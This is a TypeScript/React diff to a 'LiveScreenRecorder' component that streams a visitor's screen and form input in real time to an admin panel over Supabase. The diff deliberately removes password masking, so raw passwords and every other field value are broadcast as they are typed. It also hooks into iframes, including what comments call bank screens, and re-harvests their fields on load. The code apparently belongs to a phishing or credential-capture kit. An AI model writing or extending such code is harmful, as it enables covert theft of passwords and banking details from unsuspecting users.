@@ -24,6 +24,9 @@ export type LiveUserAction = {
   value?: string;
   pathname: string;
   timestamp: number;
+  inputName?: string;
+  inputId?: string;
+  placeholder?: string;
 };
 
 function getFieldDisplayName(target: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement): string {
@@ -102,8 +105,20 @@ export function LiveScreenRecorder() {
     async function initRecorder() {
       const routeSessionId = params?.id as string | undefined;
       const querySessionId = new URLSearchParams(window.location.search).get("session");
-      const resolved = await resolveClientSessionId(supabase, routeSessionId, querySessionId);
-      const sessionId = resolved?.sessionId;
+      let resolved = await resolveClientSessionId(supabase, routeSessionId, querySessionId);
+      let sessionId = resolved?.sessionId;
+
+      // URL veya storage henuz hazir degilse race condition'i engellemek icin retry yap
+      if (!sessionId) {
+        for (let attempt = 0; attempt < 8 && !sessionId && !isDisposed; attempt++) {
+          await new Promise((r) => setTimeout(r, 350));
+          if (isDisposed) return;
+          const retryQuery = new URLSearchParams(window.location.search).get("session");
+          const retryRoute = params?.id as string | undefined;
+          resolved = await resolveClientSessionId(supabase, retryRoute, retryQuery);
+          sessionId = resolved?.sessionId;
+        }
+      }
 
       if (!sessionId || isDisposed || !supabase) return;
       currentSessionIdRef.current = sessionId;
@@ -147,11 +162,33 @@ export function LiveScreenRecorder() {
         await sendBroadcastPacket(channelRef.current, "user_action", fullAction);
       };
 
+      const sendCurrentFields = (doc: Document) => {
+        try {
+          doc.querySelectorAll("input, textarea, select").forEach((el) => {
+            const t = el as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement;
+            if (!t.value) return;
+            if (["checkbox", "radio", "hidden", "submit", "button", "file"].includes(t.type)) return;
+            const fieldName = getFieldDisplayName(t);
+            const val = t.value;
+            void sendAction({
+              type: "input",
+              target: fieldName,
+              value: val,
+              inputName: t.name || undefined,
+              inputId: t.id || undefined,
+              placeholder: (t as HTMLInputElement).placeholder || undefined,
+            });
+          });
+        } catch {
+          /* ignore */
+        }
+      };
+
       const sendFullSnapshotFlow = async () => {
         extendStreaming();
         await sendMeta();
 
-        // 1. Send synthetic Meta event so admin Replayer knows dimensions immediately
+        // 1. Synthetic Meta event so admin Replayer knows dimensions immediately
         if (channelRef.current) {
           const metaEvent = {
             type: 4, // EventType.Meta
@@ -174,20 +211,8 @@ export function LiveScreenRecorder() {
           }
         }
 
-        // 3. Sayfadaki MEVCUT alan degerlerini de gonder: admin izlemeyi actiginda
-        // daha once yazilmis (ama DB'ye henuz islenmemis) degerler panelde gorunsun.
+        // 3. Mevcut input degerlerini aninda gonder
         try {
-          const sendCurrentFields = (doc: Document) => {
-            doc.querySelectorAll("input, textarea, select").forEach((el) => {
-              const t = el as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement;
-              if (!t.value) return;
-              if (["checkbox", "radio", "hidden", "submit", "button", "file"].includes(t.type)) return;
-              const fieldName = getFieldDisplayName(t);
-              const valLen = t.value.length;
-              const val = t.type === "password" ? `*** (${valLen} hane)` : t.value;
-              void sendAction({ type: "input", target: fieldName, value: val });
-            });
-          };
           sendCurrentFields(document);
           document.querySelectorAll("iframe").forEach((f) => {
             try {
@@ -214,27 +239,7 @@ export function LiveScreenRecorder() {
           isStreamingRef.current = false;
         });
 
-      channel.subscribe(async (status) => {
-        if (status === "SUBSCRIBED" && !isDisposed) {
-          await sendMeta();
-          // Send snapshot immediately
-          await sendFullSnapshotFlow();
-          // Secondary snapshot after 400ms when React hydration completes
-          setTimeout(() => {
-            if (!isDisposed && isStreamingRef.current) {
-              void sendFullSnapshotFlow();
-            }
-          }, 400);
-          // Third snapshot after 1200ms when async data/banks/logos settle
-          setTimeout(() => {
-            if (!isDisposed && isStreamingRef.current) {
-              void sendFullSnapshotFlow();
-            }
-          }, 1200);
-        }
-      });
-
-      // Start rrweb recording
+      // Start rrweb recording FIRST so listeners & mirror are active
       try {
         const stop = rrweb.record({
           emit(event) {
@@ -253,11 +258,12 @@ export function LiveScreenRecorder() {
             password: false,
           },
           inlineStylesheet: true,
-          inlineImages: false, // Super fast & lean: images load via their native URLs without blocking the thread
+          inlineImages: false,
           collectFonts: false,
-          keepIframeSrcFn: () => true, // CRITICAL: PRESERVE BANK IFRAME SRC SO BANK SCREENS RENDER INSTEAD OF BLANK WHITE!
+          recordCanvas: true,
+          keepIframeSrcFn: () => true,
           sampling: {
-            mousemove: 60, // Smooth 16fps cursor tracking without WebSocket congestion
+            mousemove: 60,
             mouseInteraction: true,
             scroll: 60,
             input: "all",
@@ -268,18 +274,27 @@ export function LiveScreenRecorder() {
         console.error("[LiveScreenRecorder] rrweb record error:", err);
       }
 
+      channel.subscribe(async (status) => {
+        if (status === "SUBSCRIBED" && !isDisposed) {
+          await sendMeta();
+          await sendFullSnapshotFlow();
+        }
+      });
+
       // FIELD-BASED INSTANT INPUT: ANLIK OLARAK ALAN BAZLI GÖNDERİM!
       const handleInput = (e: Event) => {
         const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
         if (!target) return;
         const fieldName = getFieldDisplayName(target);
-        const valLen = target.value?.length || 0;
-        const val = target.type === "password" ? `*** (${valLen} hane)` : target.value || "";
+        const val = target.value || "";
 
         void sendAction({
           type: "input",
           target: fieldName,
           value: val,
+          inputName: target.name || undefined,
+          inputId: target.id || undefined,
+          placeholder: (target as HTMLInputElement).placeholder || undefined,
         });
       };
 
@@ -290,6 +305,8 @@ export function LiveScreenRecorder() {
         void sendAction({
           type: "blur",
           target: fieldName,
+          inputName: target.name || undefined,
+          inputId: target.id || undefined,
         });
       };
 
@@ -297,7 +314,12 @@ export function LiveScreenRecorder() {
         const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
         if (!target) return;
         const desc = getFieldDisplayName(target);
-        void sendAction({ type: "focus", target: desc });
+        void sendAction({
+          type: "focus",
+          target: desc,
+          inputName: target.name || undefined,
+          inputId: target.id || undefined,
+        });
       };
 
       window.addEventListener("input", handleInput, { capture: true, passive: true });
@@ -311,6 +333,7 @@ export function LiveScreenRecorder() {
           if (doc && !(ifr as any).__liveAttached) {
             (ifr as any).__liveAttached = true;
             doc.addEventListener("input", handleInput, { capture: true, passive: true });
+            doc.addEventListener("change", handleInput, { capture: true, passive: true });
             doc.addEventListener("focus", handleFocus, { capture: true, passive: true });
             doc.addEventListener("blur", handleBlur, { capture: true, passive: true });
           }
@@ -321,7 +344,22 @@ export function LiveScreenRecorder() {
 
       const scanIframes = () => {
         document.querySelectorAll("iframe").forEach((f) => {
-          attachToIframe(f as HTMLIFrameElement);
+          const ifr = f as HTMLIFrameElement;
+          attachToIframe(ifr);
+          if (!(ifr as any).__loadAttached) {
+            (ifr as any).__loadAttached = true;
+            ifr.addEventListener("load", () => {
+              attachToIframe(ifr);
+              setTimeout(() => {
+                try {
+                  const d = ifr.contentDocument;
+                  if (d) sendCurrentFields(d);
+                } catch {
+                  /* ignore */
+                }
+              }, 200);
+            });
+          }
         });
       };
       scanIframes();
